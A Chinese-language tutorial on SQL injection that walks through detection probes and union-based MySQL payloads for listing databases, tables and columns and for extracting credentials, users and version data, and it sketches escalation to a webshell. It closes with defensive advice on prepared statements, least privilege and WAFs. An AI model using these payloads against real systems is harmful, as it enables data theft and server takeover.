# SQL Inject （SQL注入攻击）

## 简介
- SQL注入攻击的主要原理
- 通过构造非法的SQL语法，使得程序报错
- 得到错误的SQL语句，则可以针对原始SQL语句特征
- 进行构造正确语法的SQL，进行攻击
- 因此，防范的角度来说
- 首先，不要将报错信息返回
- 其次，使用预处理语句，不要直接拼接SQL
- 最后，使用SQL注入防护组件，比如基于规则的过滤器，或者正确使用ORM框架

## 案例
- 字符型注入，利用常见的username字段进行注入

### 原始查询语句
```sql
SELECT id,username,realname FROM sys_user 
WHERE username='-1' and status=1
```
- 由于一般进行注入之后，都会利用注释忽略之后的SQL
- 因此，后续给出最终指定的SQL中
- 被注释掉的部分就不在给出
- 对于本案例来说
- 这部分就是被注释的内容
```sql
' and status=1
```

### 判断是否存在SQL注入
```sql
-1' --
```
- 构成了错误的语法，报错级存在SQL注入
    - 这种是针对字符型的注入，直接注释后续SQL
    - 导致'单引号不匹配，引发SQL错误
```sql
SELECT id,username,realname FROM sys_user 
where username='-1' -- '  and status=1
```
- 另外一种方式
```sql
'
```
- 同样，是构成错误的SQL语法
    - 这样的判断方式，适用于字符型和数值型注入方式的判断
    - 也是最容易记忆和使用的
    - 同样是利用'单引号不匹配，引发SQL错误
```sql
SELECT id,username,realname FROM sys_user 
where username='''  and status=1
```
- 当然还有很多方式
```sql
-1' or 1=1 --
```


### union 注入攻击
- 步骤，union的特性是需要在查询中使用
- 并且union的列数需要一致
- 并且union前后的数据类型需要一致
- 因此，出发点如下
- 使用order by 探测原来的查询的列数
- 闭合条件，保证SQL语法没问题，使用单引号加注释符号
- 构造不存在的条件，绕过原来的查询语句的类型，比如id=-1
- 构造符合列数的union语句进行注入

### 判断列数
- 当出现报错时，则已经达到最大列数
- 当order by 1,2,3,4时，则报错
- 说明最大列数为4-1=3
- 攻击语句
```shell script
-1' order by 1,2,3 --
```
```sql
SELECT id,username,realname FROM sys_user 
WHERE username='-1' order by 1,2,3 --
```

### 获取数据
- 主要原理
- 因为是用户名，需要表不存在的用户名
- 所以这里username='-1'是不存在的用户名
- 这里针对mysql,所以库名信息，在information_schema这个数据库中
- 由于列数的限制，一般使用group_concat和concat进行得到更多的列数据

### 曝库
- 攻击语句
```sql
-1' union select 1,group_concat(schema_name),3 from information_schema.schemata -- 
```
- 最终执行SQL
```sql
SELECT id,username,realname FROM sys_user 
WHERE username='-1' union select 1,group_concat(schema_name),3 from information_schema.schemata -- 
```

### 曝表
- 攻击语句
```sql
-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='i2f_proj'  -- 
```
- 最终执行SQL
```sql
SELECT id,username,realname FROM sys_user 
WHERE username='-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='i2f_proj'  -- 
```

### 曝表字段
- 攻击语句
```sql
-1'union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='i2f_proj' and table_name='sys_user' --
```
- 最终执行SQL
```sql
SELECT id,username,realname FROM sys_user 
WHERE username='-1'union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='i2f_proj' and table_name='sys_user' --
```

## 曝数据
- 攻击语句
```sql
-1'union select 1,concat(username,'/',password),3 from sys_user where id=1 --
```
- 最终执行SQL
```sql
SELECT id,username,realname FROM sys_user 
WHERE username='-1'union select 1,concat(username,'/',password),3 from sys_user where id=1 --
```

### 曝用户名
- 攻击语句
```sql
-1'union select 1,group_concat(concat(host,'@',user)),3 from mysql.user --
```
- 最终执行SQL
```sql
SELECT id,username,realname FROM sys_user 
WHERE username='-1'union select 1,group_concat(concat(host,'@',user)),3 from mysql.user --
```

## 获取当前用户
- 攻击语句
```sql
-1'union select 1,user(),3 from dual --
```
- 最终执行SQL
```sql
SELECT id,username,realname FROM sys_user 
WHERE username='-1'union select 1,user(),3 from dual --
```

### 获取当前数据库
- 攻击语句
```sql
-1'union select 1,database(),3 from dual --
```
- 最终执行SQL
```sql
SELECT id,username,realname FROM sys_user 
WHERE username='-1'union select 1,database(),3 from dual --
```

### 获取当前版本
- 攻击语句
```shell script
-1'union select 1,version(),3 from dual --
```
- 最终执行SQL
```sql
SELECT id,username,realname FROM sys_user 
WHERE username='-1'union select 1,version(),3 from dual --
```


## 危害
- 这是在查询语句中的危害
- 如果在更新或者删除等语句中
- 则可能导致数据被错误更新
- 数据被错误删除等严重后果
- 最简单的例子就是 where ... or 1=1
- 可以看到，许多信息都能够被获取到
- 但是仅限于查询吗？
- 不，配合数据库的一些其他系统函数
- 便可以得到服务器的shell或者数据库的shell
- 这样，整个服务器便被攻破
- 以mysql为例
- 结合load_file dump_file outfile exec等命令
- 将webshell木马写入到web网站目录下
- 即可实现任意命令执行的漏洞
- 这些语句执行时需要一定的条件的
- 一般情况下，需要是超级管理员的数据库权限
- 另外，这类型的注入，一般需要配合多语句执行使用
- 也就是通过;分号进行添加自己想要执行的任意命令
- 相比较于union注入，则更加灵活
- 因此从防护的角度来说
- 限制应用连接数据库的权限，超级管理员权限仅限本机能够访问
- 禁用多语句执行环境


## 总结
### SQL注入的风险
- 不仅仅限于泄露数据
- 甚至被拖库
- 甚至数据库被控制
- 甚至服务器被控制

### 防范上
- 具备安全开发意思
- 避免使用未预处理的语句
- 如果实在需要未预处理的语句拼接
- 必须严格控制拼接语句
- 正确使用更加安全的开发语言或者框架
- 正确使用ORM框架
- 避免使用超级管理员权限用户
- 禁用超级管理员用户的远程连接
- 禁用多语句执行
- 另外，在使用http header时，也需要严格校验请求头
- 避免SQL注入攻击
- 比如常见被使用来SQL注入的请求头包括如下
- refer,业务上本意用来检查是否是来自可信网站
- host,业务上用来记录IP
- x-forward-for,业务上用来记录IP
- user-agent,业务上用来记录浏览器信息
- 使用SQL注入防火墙
- 使用waf防火墙产品
